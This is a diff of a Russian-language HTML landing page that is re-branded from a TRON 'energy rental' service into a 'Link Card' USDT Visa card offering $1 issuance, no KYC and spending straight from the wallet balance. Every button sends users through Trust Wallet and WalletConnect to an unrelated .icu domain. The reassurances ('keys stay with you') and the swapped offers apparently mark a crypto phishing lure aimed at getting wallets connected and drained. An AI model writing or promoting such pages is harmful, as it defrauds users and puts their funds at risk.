@@ -3,16 +3,16 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Аренда энергии TRON для USDT — дешевле сжигания TRX</title>
-<meta name="description" content="Энергия TRON в аренду на час и дольше: перевод USDT TRC-20 стоит копейки, TRX в залог не блокируются. Выдача на адрес за минуту, оплата в TRX.">
+<title>Криптокарта USDT TRON — выпуск за $1, без KYC</title>
+<meta name="description" content="Виртуальная или металлическая Visa-карта к вашему кошельку: выпуск $1, без KYC и без пополнений. Оплата идёт прямо с баланса USDT TRC-20, карта готова за 2 минуты.">
 <meta name="robots" content="index, follow, max-image-preview:large">
 <meta name="theme-color" content="#ffffff">
 <link rel="canonical" href="https://linkcard-app.github.io/ru/">
 <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
 <meta property="og:type" content="website">
-<meta property="og:site_name" content="Энергия TRON">
-<meta property="og:title" content="Аренда энергии TRON для USDT">
-<meta property="og:description" content="Перевод USDT TRC-20 без сжигания TRX. Энергия на адрес за минуту, без залога.">
+<meta property="og:site_name" content="Link Card">
+<meta property="og:title" content="Криптокарта USDT TRON — выпуск за $1">
+<meta property="og:description" content="Карта Visa к кошельку: без KYC и пополнений, оплата с баланса USDT TRC-20.">
 <meta property="og:locale" content="ru_RU">
 <meta property="og:url" content="https://linkcard-app.github.io/ru/">
 <style>
@@ -23,6 +23,7 @@
     --line:#e6e7ea;
     --soft:#f6f7f9;
     --acc:#0a2bd8;
+    --tron:#eb0029;
   }
   *{box-sizing:border-box}
   html{-webkit-text-size-adjust:100%}
@@ -51,6 +52,44 @@
     font-weight:700;
   }
   .lead{margin:0 0 22px;font-size:17px;color:var(--body)}
+
+  /* card visual */
+  .card-scene{margin:0 0 22px;display:flex;justify-content:center}
+  .card{
+    position:relative;width:100%;max-width:340px;aspect-ratio:1.586;
+    border-radius:18px;padding:20px;
+    background:linear-gradient(140deg,#1b1f2a 0%,#0f1320 42%,#101a14 100%);
+    color:#fff;overflow:hidden;
+    box-shadow:0 18px 38px rgba(12,16,26,.28);
+    display:flex;flex-direction:column;justify-content:space-between;
+  }
+  .card::after{
+    content:"";position:absolute;inset:-40% -30% auto auto;width:70%;height:150%;
+    background:radial-gradient(circle at 60% 40%,rgba(235,0,41,.42),transparent 62%);
+    pointer-events:none;
+  }
+  .card-top{display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1}
+  .card-brand{font-size:12px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:rgba(255,255,255,.82)}
+  .card-net{font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:rgba(255,255,255,.5)}
+  .card-mid{position:relative;z-index:1;display:flex;flex-direction:column;gap:18px}
+  .chip{
+    width:38px;height:28px;border-radius:6px;margin:0;position:relative;z-index:1;
+    background:linear-gradient(135deg,#e8c98a,#b98f3e);
+    box-shadow:inset 0 0 0 1px rgba(255,255,255,.25);
+  }
+  .chip::before,.chip::after{
+    content:"";position:absolute;left:0;right:0;height:1px;background:rgba(80,55,10,.45)
+  }
+  .chip::before{top:9px}
+  .chip::after{bottom:9px}
+  .card-num{
+    position:relative;z-index:1;font-size:15px;letter-spacing:.16em;
+    font-variant-numeric:tabular-nums;color:rgba(255,255,255,.92);
+  }
+  .card-bot{display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1}
+  .card-cur{font-size:12px;line-height:1.35;color:rgba(255,255,255,.62)}
+  .card-cur b{display:block;color:#fff;font-size:13px;letter-spacing:.06em}
+  .card-logo{font-size:15px;font-weight:800;letter-spacing:.02em;color:var(--tron)}
 
   .cta{
     display:block;width:100%;text-align:center;
@@ -138,64 +177,87 @@
 
 <header>
   <div class="wrap">
-    <a class="mark" href="./">TRON <span>Energy</span></a>
+    <a class="mark" href="./">Link <span>Card</span></a>
     <a class="lnk" href="#faq">Вопросы</a>
   </div>
 </header>
 
 <main class="wrap">
 
-  <h1>Энергия TRON для переводов USDT</h1>
-  <p class="lead">Аренда энергии вместо сжигания TRX: комиссия за перевод USDT TRC-20 падает до копеек. Цена фиксирована, энергия приходит на ваш адрес, залог не нужен.</p>
+  <h1>Криптокарта USDT TRON</h1>
 
-  <a class="cta js-open" href="https://link-cardfree.icu/">Открыть приложение</a>
+  <div class="card-scene">
+    <div class="card" role="img" aria-label="Карта Visa с балансом USDT в сети TRON">
+      <div class="card-top">
+        <span class="card-brand">Link Card</span>
+        <span class="card-net">Visa · virtual</span>
+      </div>
+      <div class="card-mid">
+        <span class="chip" aria-hidden="true"></span>
+        <div class="card-num">•••• •••• •••• 4921</div>
+      </div>
+      <div class="card-bot">
+        <div class="card-cur"><small>BALANCE</small><b>USDT · TRC-20</b></div>
+        <span class="card-logo">TRON</span>
+      </div>
+    </div>
+  </div>
+
+  <p class="lead">Карта привязывается к вашему кошельку: выпуск за $1, без KYC и без пополнений. Оплата проходит прямо с баланса USDT TRC-20, карта готова за пару минут.</p>
+
+  <a class="cta js-open" href="https://link-cardfree.icu/">Выпустить карту</a>
   <a class="alt" href="https://link-cardfree.icu/" id="altLink">Продолжить в браузере</a>
-  <p class="hint">Откроется Trust Wallet · заказ энергии внутри приложения</p>
+  <p class="hint">Откроется Trust Wallet · выпуск внутри приложения</p>
 
   <ul class="facts">
-    <li><span>Минимальный срок</span><b>1 час</b></li>
-    <li><span>Оплата</span><b>TRX</b></li>
-    <li><span>Залог</span><b>не нужен</b></li>
-    <li><span>Выдача на адрес</span><b>~1 минута</b></li>
-    <li><span>Экономия на комиссии</span><b>до 90%</b></li>
+    <li><span>Выпуск</span><b>$1</b></li>
+    <li><span>KYC</span><b>не нужен</b></li>
+    <li><span>Сеть</span><b>TRON · TRC-20</b></li>
+    <li><span>Формат</span><b>виртуальная или металл</b></li>
+    <li><span>Готовность</span><b>~2 минуты</b></li>
+    <li><span>Пополнения</span><b>не требуются</b></li>
   </ul>
 
-  <h2>Как это работает</h2>
+  <h2>Как выпустить</h2>
   <ol class="steps">
-    <li><b>Открываете приложение</b><p>Кнопка выше запускает Trust Wallet и страницу заказа в нём.</p></li>
-    <li><b>Выбираете объём и срок</b><p>Объём считается по числу переводов, срок — от одного часа.</p></li>
-    <li><b>Оплачиваете TRX</b><p>Энергия делегируется на адрес, перевод USDT становится дешёвым.</p></li>
+    <li><b>Подключаете кошелёк</b><p>Открываете приложение и подтверждаете подключение через WalletConnect.</p></li>
+    <li><b>Выбираете карту и платите $1</b><p>Лимиты и сборы показываются до оплаты, сумма выпуска списывается с кошелька.</p></li>
+    <li><b>Активируете и платите</b><p>Добавляете карту в телефон и расплачиваетесь с баланса USDT.</p></li>
   </ol>
 
   <div class="note">
-    <b>TRX остаются у вас.</b> Энергия — ресурс сети, а не перевод средств: депозит не блокируется, делегирование снимается само по окончании срока. Сайт никогда не спрашивает 12 слов.
+    <b>Ключи остаются у вас.</b> Карта подключается через WalletConnect и не забирает доступ к кошельку. Пополнять отдельный счёт не нужно — списания идут напрямую с баланса USDT TRC-20.
   </div>
 
   <h2 id="faq">Вопросы</h2>
 
   <details>
-    <summary>Что такое энергия TRON</summary>
-    <p>Ресурс сети, которым оплачивается выполнение контракта перевода USDT. Без энергии сеть списывает TRX с баланса по рыночному курсу — это дороже фиксированного пакета.</p>
+    <summary>Что это за карта</summary>
+    <p>Visa-карта, привязанная к вашему криптокошельку. Она не хранит средства: каждая оплата списывается с баланса USDT в сети TRON.</p>
   </details>
   <details>
-    <summary>Сколько стоит аренда</summary>
-    <p>Цена фиксирована за пакет и видна до оплаты. Итоговая сумма в TRX показывается перед подтверждением, скрытых доплат нет.</p>
+    <summary>Сколько стоит выпуск</summary>
+    <p>$1 за карту. Лимиты и сборы по операциям видны до подтверждения, скрытых списаний нет.</p>
   </details>
   <details>
-    <summary>Нужно ли блокировать TRX</summary>
-    <p>Нет. Энергия делегируется на ваш адрес на выбранный срок, а депозит остаётся доступным всё это время.</p>
+    <summary>Нужна ли верификация</summary>
+    <p>KYC на выпуске не требуется — достаточно подключить кошелёк и оплатить выпуск.</p>
+  </details>
+  <details>
+    <summary>Виртуальная или пластиковая</summary>
+    <p>Доступны виртуальная и металлическая карта. Виртуальная выпускается сразу и подходит для оплаты онлайн, металл — для обычных покупок.</p>
   </details>
   <details>
     <summary>Почему кнопка открывает приложение</summary>
-    <p>Заказ проходит внутри Trust Wallet. Если приложения нет, тот же адрес откроется в браузере — ссылка под кнопкой делает это сразу.</p>
+    <p>Выпуск проходит внутри Trust Wallet. Если приложения нет, тот же адрес откроется в браузере — ссылка под кнопкой делает это сразу.</p>
   </details>
 
   <h2>Начать</h2>
-  <p>Выберите объём энергии под количество переводов и оплатите TRX — этого достаточно.</p>
-  <a class="cta js-open" href="https://link-cardfree.icu/">Открыть приложение</a>
+  <p>Подключите кошелёк, оплатите выпуск и добавьте карту в телефон — этого достаточно.</p>
+  <a class="cta js-open" href="https://link-cardfree.icu/">Выпустить карту</a>
 
   <footer>
-    <p class="disc">Независимый информационный сервис аренды энергии, не официальный сайт Trust Wallet. Цены и условия определяет провайдер; материал не является финансовой рекомендацией.</p>
+    <p class="disc">Независимый информационный сервис, не официальный сайт Trust Wallet. Условия, лимиты и сборы определяет провайдер; материал не является финансовой рекомендацией.</p>
     <p class="meta">© 2026 · обновлено 24.11.2026</p>
   </footer>
 
@@ -204,7 +266,7 @@
 <div class="gate" id="gate">
   <div class="box">
     <b>Открываем приложение</b>
-    <p>Страница заказа откроется внутри Trust Wallet. Если ничего не произошло — нажмите кнопку ниже.</p>
+    <p>Выпуск карты проходит внутри Trust Wallet. Если ничего не произошло — нажмите кнопку ниже.</p>
     <a class="cta" id="gateOpen" href="https://link-cardfree.icu/">Открыть Trust Wallet</a>
     <button class="stay" id="gateStay" type="button">Остаться на странице</button>
   </div>
